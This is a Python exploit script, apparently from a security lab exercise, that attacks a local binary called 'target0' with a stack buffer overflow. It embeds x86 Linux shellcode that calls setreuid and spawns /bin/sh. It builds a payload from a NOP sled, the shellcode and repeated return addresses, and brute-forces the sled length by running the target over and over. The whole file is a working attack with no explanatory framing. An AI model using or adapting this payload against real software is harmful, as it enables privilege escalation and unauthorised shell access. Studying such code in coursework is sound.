import subprocess

# Constants
TARGET = "./target0"
SHELLCODE = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)
BUFFER_SIZE = 400
SHELLCODE_LEN = 63
RETURN_ADDRESS = b"\x30\xd3\xff\xff"  # Example address, adjust as needed

def test_exploit(nop_length):
    total_return_length = BUFFER_SIZE - nop_length - SHELLCODE_LEN - 1  # -1 for null terminator
    if total_return_length < 0:
        return "Invalid configuration"
    
    nop_sled = b"\x90" * nop_length
    return_count = total_return_length // len(RETURN_ADDRESS)
    extra_bytes = total_return_length % len(RETURN_ADDRESS)  # Calculate leftover space after full return addresses

    # Construct the payload
    payload = nop_sled + SHELLCODE + (RETURN_ADDRESS * return_count) + (b"\x90" * extra_bytes)  # Fill leftover space with NOPs
    payload += b'\x00'  # Null terminator to ensure string ends properly

    # Ensure the payload length matches the buffer size
    assert len(payload) == BUFFER_SIZE, f"Payload size mismatch: {len(payload)} != {BUFFER_SIZE}"

    # Run the program with the payload
    try:
        output = subprocess.check_output([TARGET], input=payload)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return "Crash or runtime error"


# Main testing loop
for nop_len in range(336):  # Up to the maximum space available for NOP sled
    result = test_exploit(nop_len)
    print(f"Testing NOP length: {nop_len}, Result: {result}")
